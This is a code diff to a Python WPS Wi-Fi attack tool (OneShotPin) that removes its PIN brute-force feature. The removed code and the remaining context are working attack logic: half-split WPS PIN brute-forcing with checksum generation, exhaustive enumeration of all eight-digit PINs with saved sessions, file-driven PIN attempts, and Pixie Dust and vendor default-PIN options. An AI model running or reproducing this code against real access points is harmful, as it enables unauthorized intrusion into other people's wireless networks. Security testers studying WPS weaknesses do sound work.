@@ -9,8 +9,6 @@ import socket
 import pathlib
 import time
 from datetime import datetime
-import collections
-import statistics
 import csv
 from typing import Dict
 import hashlib
@@ -553,42 +551,6 @@ class ConnectionStatus:
     def clear(self):
         self.__init__()
 
-class BruteforceStatus:
-    def __init__(self):
-        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        self.mask = ''
-        self.last_attempt_time = time.time()
-        self.attempts_times = collections.deque(maxlen=15)
-
-        self.counter = 0
-        self.statistics_period = 5
-
-    def display_status(self):
-        average_pin_time = statistics.mean(self.attempts_times)
-        if len(self.mask) == 4:
-            percentage = int(self.mask) / 11000 * 100
-        elif len(self.mask) == 7:
-            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
-        elif len(self.mask) == 8:
-            percentage = int(self.mask) / 100000000 * 100
-        else:
-            percentage = 0
-        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
-            percentage, self.start_time, average_pin_time))
-
-    def registerAttempt(self, mask):
-        self.mask = mask
-        self.counter += 1
-        current_time = time.time()
-        self.attempts_times.append(current_time - self.last_attempt_time)
-        self.last_attempt_time = current_time
-        if self.counter == self.statistics_period:
-            self.counter = 0
-            self.display_status()
-
-    def clear(self):
-        self.__init__()
-
 class Companion:
     """Main application part"""
     def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
@@ -938,78 +900,6 @@ class Companion:
             if store_pin_on_fail:
                 self.__savePin(bssid, pin)
             return False
-
-    def __first_half_bruteforce(self, bssid, f_half, delay=None):
-        """
-        @f_half — 4-character string
-        """
-        checksum = self.generator.checksum
-        while int(f_half) < 10000:
-            check_exit()
-            t = int(f_half + '000')
-            pin = '{}000{}'.format(f_half, checksum(t))
-            self.single_connection(bssid, pin)
-            if self.connection_status.isFirstHalfValid():
-                print('[+] First half found')
-                return f_half
-            elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
-                return self.__first_half_bruteforce(bssid, f_half)
-            f_half = str(int(f_half) + 1).zfill(4)
-            self.bruteforce.registerAttempt(f_half)
-            if delay:
-                time.sleep(delay)
-            check_exit()
-        print('[-] First half not found')
-        return False
-
-    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
-        """
-        @f_half — 4-character string
-        @s_half — 3-character string
-        """
-        checksum = self.generator.checksum
-        while int(s_half) < 1000:
-            check_exit()
-            t = int(f_half + s_half)
-            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
-            self.single_connection(bssid, pin)
-            if self.connection_status.last_m_message > 6:
-                return pin
-            elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
-                return self.__second_half_bruteforce(bssid, f_half, s_half)
-            s_half = str(int(s_half) + 1).zfill(3)
-            self.bruteforce.registerAttempt(f_half + s_half)
-            if delay:
-                time.sleep(delay)
-            check_exit()
-        return False
-
-    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
-        if (not start_pin) or (len(start_pin) < 4):
-            try:
-                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-                with open(filename, 'r') as file:
-                    if user_input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
-                        mask = file.readline().strip()
-                    else:
-                        raise FileNotFoundError
-            except FileNotFoundError:
-                mask = '0000'
-        else:
-            mask = start_pin[:7]
-
-        self.bruteforce = BruteforceStatus()
-        self.bruteforce.mask = mask
-        if len(mask) == 4:
-            f_half = self.__first_half_bruteforce(bssid, mask, delay)
-            if f_half and (self.connection_status.status != 'GOT_PSK'):
-                self.__second_half_bruteforce(bssid, f_half, '001', delay)
-        elif len(mask) == 7:
-            f_half = mask[:4]
-            s_half = mask[4:]
-            self.__second_half_bruteforce(bssid, f_half, s_half, delay)
 
     def __print_with_indicators(self, level, msg):
         print('[{}] [{}] {}'.format(level, self.lastPwr, msg))
@@ -1394,82 +1284,6 @@ def try_pin_sequence(comp, bssid, pins, pixie=False, delay=None):
         if delay:
             time.sleep(delay)
     return False
-
-
-def try_bruteforce_file(comp, bssid, path, delay=None):
-    filename = None
-    for p in [path, os.path.join(os.path.dirname(__file__), path)]:
-        if os.path.exists(p):
-            filename = p
-            break
-    if not filename:
-        print(f"[!] Failed to open bruteforce file: {path}")
-        return False
-    while True:
-        with open(filename, 'r') as f:
-            pin = f.readline().strip()
-            if not pin:
-                print('[-] No more pins left')
-                return False
-        if pin in TRIED_PINS:
-            with open(filename, 'r+') as f:
-                f.readline()
-                rest = f.read()
-                f.seek(0)
-                f.write(rest)
-                f.truncate()
-            continue
-        print(f"[*] WPS Pin: {pin} (bruteforce)")
-        TRIED_PINS.add(pin)
-        success = comp.single_connection(bssid, pin)
-        with open(filename, 'r+') as f:
-            f.readline()
-            rest = f.read()
-            f.seek(0)
-            f.write(rest)
-            f.truncate()
-        if success:
-            return True
-        if delay:
-            time.sleep(delay)
-
-
-def bruteforce_all_pins(comp, bssid, ssid=None, delay=None):
-    filename = os.path.join(comp.sessions_dir, f"{bssid.replace(':', '').upper()}_{(ssid or 'UNKNOWN').replace(' ', '_')}.pins")
-    if not os.path.exists(filename):
-        with open(filename, 'w') as f:
-            for i in range(100000000):
-                f.write(f"{i:08d}\n")
-    status = BruteforceStatus()
-    while True:
-        with open(filename, 'r') as f:
-            pin = f.readline().strip()
-            if not pin:
-                print('[-] No more pins left')
-                return False
-        if pin in TRIED_PINS:
-            with open(filename, 'r+') as f:
-                f.readline()
-                rest = f.read()
-                f.seek(0)
-                f.write(rest)
-                f.truncate()
-            continue
-        print(f"[*] WPS Pin: {pin} (bruteforce)")
-        status.registerAttempt(pin)
-        TRIED_PINS.add(pin)
-        success = comp.single_connection(bssid, pin)
-        with open(filename, 'r+') as f:
-            f.readline()
-            rest = f.read()
-            f.seek(0)
-            f.write(rest)
-            f.truncate()
-        if success:
-            return True
-        if delay:
-            time.sleep(delay)
-
 def build_parser():
     parser = argparse.ArgumentParser(description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg', epilog='Example: %(prog)s --interface wlan0 --bssid 00:90:4C:C1:AC:21 --pixie-dust')
     parser.add_argument('--interface', type=str, required=True, help='Name of the interface to use')
@@ -1480,7 +1294,6 @@ def build_parser():
         help='Use the specified pin (arbitrary string or 4/8 digit pin; requires --bssid and --pixie-dust)')
     parser.add_argument('--pixie-dust', action='store_true', help='Run Pixie Dust attack')
     parser.add_argument('--pixie-force', action='store_true', help='Run Pixiewps with --force option (bruteforce full range)')
-    parser.add_argument('--bruteforce-pins', nargs='?', const=True, help='Bruteforce all pins with progress saved per network when no file is given, otherwise try PINs from the specified file')
     parser.add_argument('--push-button-connect', action='store_true', help='Run WPS push button connection')
     parser.add_argument('--delay', type=float, help='Set the delay between pin attempts')
     parser.add_argument('--write', action='store_true', help='Write credentials to the file on success')
@@ -1543,15 +1356,7 @@ if __name__ == '__main__':
                                     if not try_pin_sequence(companion, args.bssid, pins, delay=args.delay):
                                         if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p], delay=args.delay):
                                             if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p], delay=args.delay):
-                                                if isinstance(args.bruteforce_pins, str):
-                                                    print('[*] Trying PINs from file...')
-                                                    if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins, delay=args.delay):
-                                                        print('[-] All PIN attempts failed')
-                                                elif args.bruteforce_pins is True:
-                                                    print('[*] Bruteforcing all pins...')
-                                                    bruteforce_all_pins(companion, args.bssid, essid, delay=args.delay)
-                                                else:
-                                                    print('[-] All PIN attempts failed')
+                                                print('[-] All PIN attempts failed')
         if not args.loop:
             break
         else:
